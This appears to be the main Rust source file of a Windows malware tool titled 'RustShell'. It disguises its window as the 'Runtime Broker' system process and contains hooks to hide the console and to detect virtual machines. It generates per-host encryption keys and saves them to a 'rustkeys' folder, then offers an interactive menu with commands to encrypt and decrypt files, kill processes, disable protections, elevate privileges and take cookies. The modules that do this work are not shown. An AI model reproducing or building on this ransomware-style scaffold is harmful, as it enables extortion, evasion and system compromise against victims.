#![allow(non_snake_case)]
#![windows_subsystem = "windows"]

use std::io::{self, Write, Read, stdout, BufRead, BufReader, prelude::*};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::um::wincon::SetConsoleTitleW;
use colored::*;
use std::{fs::{File, self, OpenOptions}, env, process::{Command}, path::{Path, PathBuf}};
use sysinfo::{ProcessExt, System, SystemExt, UserExt, DiskExt};
use rand::{rngs::OsRng, RngCore};
use hkdf::Hkdf;
use sha2::Sha256;
use hex;

mod hide_window;
mod functions;
mod encrypt;
mod antivm;

fn main() -> Result<(), anyhow::Error> {
    // hides the cmd window
    // hide_window::hide_console_window();

    // Set the cmd window title
    let new_title = "Runtime Broker";
    let title: Vec<u16> = OsStr::new(new_title)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();
    unsafe { 
        SetConsoleTitleW(title.as_ptr()) 
    };

    // Checks if the program is running in a VM
    //antivm::antivm();

    // run the systeminfo command
    let output = Command::new("systeminfo")
        .output()
        .expect("Failed to run systeminfo command");

    // convert the output to a string and trim leading/trailing whitespaces
    let output_string = String::from_utf8(output.stdout)
        .expect("Failed to convert output to string")
        .trim()
        .to_string();

        // split the output string into lines
        let lines: Vec<&str> = output_string.split('\n').collect();

    // find the HostName line and extract the hostname
    let host_line = lines
        .iter()
        .find(|line| line.starts_with("Host Name"))
        .expect("Host Name not found");
    let host = host_line.split(':').nth(1).unwrap_or("").trim();

    // check if 'OS Name' was appended to the hostname
    let host = if host.ends_with("OS Name") {
        &host[..(host.len() - 6)]
    } else {
        host
    };


    let mut key = [0u8; 32];
    let mut nonce = [0u8; 19];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce);

    println!("{}", hex::encode(key));

    let key = hex::encode(key);
    let nonce = hex::encode(nonce);

    // Create the rustkeys folder if it doesn't exist
    let folder_name = "rustkeys";
    if !Path::new(folder_name).exists() {
        fs::create_dir(folder_name)?;
    }

    // Create the CSV file with the hostname as its name
    let file_name = format!("{}.csv", host);
    let file_path = PathBuf::from(folder_name).join(file_name);

    // Check if the file already exists, and if it does, read the key and nonce from the file
    let mut key_from_file = String::new();
    let mut nonce_from_file = String::new();
    if let Ok(mut file) = File::open(&file_path) {
        let mut contents = String::new();
        file.read_to_string(&mut contents)?;
        let parts: Vec<&str> = contents.trim().split(',').collect();
        nonce_from_file = parts[0].to_string();
        key_from_file = parts[1].to_string();
    }

    // If the file doesn't exist, or if the key or nonce are empty, use the generated key and nonce
    let key_to_use = if !key_from_file.is_empty() { 
        key_from_file 
    } else { 
        key 
    };
    let nonce_to_use = if !nonce_from_file.is_empty() { 
        nonce_from_file 
    } else { 
        nonce 
    };

    let mut file = File::create(&file_path)?;

    // Write the key and nonce to the CSV file
    writeln!(file, "{},{}", nonce_to_use, key_to_use)?;

    let key_to_use: [u8; 32] = hex::decode(key_to_use)?.try_into().unwrap();
    let nonce_to_use: [u8; 19] = hex::decode(nonce_to_use)?.try_into().unwrap();

    // Enable ANSI support for Windows 10
    ansi_term::enable_ansi_support().unwrap();

    // Clear the command prompt
    print!("{}[2J", 27 as char);
    stdout().flush().unwrap();

    let lines = [
        "    /$$$$$$$                        /$$      /$$$$$$  /$$                 /$$ /$$ ",
        "   | $$__  $$                      | $$     /$$__  $$| $$                | $$| $$ ",
        "   | $$  \\ $$ /$$   /$$  /$$$$$$$ /$$$$$$  | $$  \\__/| $$$$$$$   /$$$$$$ | $$| $$ ",
        "   | $$$$$$$/| $$  | $$ /$$_____/|_  $$_/  |  $$$$$$ | $$__  $$ /$$__  $$| $$| $$ ",
        "   | $$__  $$| $$  | $$|  $$$$$$   | $$     \\____  $$| $$  \\ $$| $$$$$$$$| $$| $$ ",
        "   | $$  \\ $$| $$  | $$ \\____  $$  | $$ /$$ /$$  \\ $$| $$  | $$| $$_____/| $$| $$ ",
        "   | $$  | $$|  $$$$$$/ /$$$$$$$/  |  $$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$ ",
        "   |__/  |__/ \\______/ |_______/    \\___/   \\______/ |__/  |__/ \\_______/|__/|__/ ",
        "",
    ];

    for line in &lines {
        println!("{}", line.truecolor(80, 12, 170));
    }

    loop {
        print!("{}", "          > ".truecolor(120, 120, 120));

        io::stdout().flush()?;

        let mut input = String::new();
        io::stdin().read_line(&mut input)?;

        let input = input.trim();

        let mut parts = input.splitn(2, ' ');
        let command = parts.next().unwrap_or("");

        if input.is_empty() {
            // If the user didn't enter any input, print the prompt again and continue
            io::stdout().flush()?;
            continue;
        }
        
        match command {
            "exit" | "quit" => {
                break;
            }
            "rm" | "del" => {
                functions::remove();
            }
            "tree" => {
                functions::tree()
            }
            "clear" | "cls" => {
                print!("{}[2J", 27 as char);
                stdout().flush().unwrap();
                for line in &lines {
                    println!("{}", line.truecolor(80, 12, 170));
                }
            }
            "find" => {
                functions::find();
            }
            "where" => {
                functions::whereis();
            }
            "scan" => {
                functions::scan();
            }
            "cookies" => {
                //functions::cookies();
            }
            "encrypt" | "enc" => {
                encrypt::encrypt(
                    &key_to_use,
                    &nonce_to_use,
                )?;
            }
            "decrypt" | "dec" => {
                encrypt::decrypt(
                    &key_to_use,
                    &nonce_to_use,
                )?;
            }
            "help" => {
                functions::help();
            }
            "info" => {
                functions::info();
            }
            "kill" => {
                functions::kill();
            }
            "disable" => {
                functions::disable();
            }
            "elevate" => {
                functions::elevate();
            }
            _ => println!("{} Type '{}' for a list of commands.", "        Command not found.".truecolor(255, 0, 0), "help".truecolor(80, 0, 255)),
        }
    }
    Ok(())
}
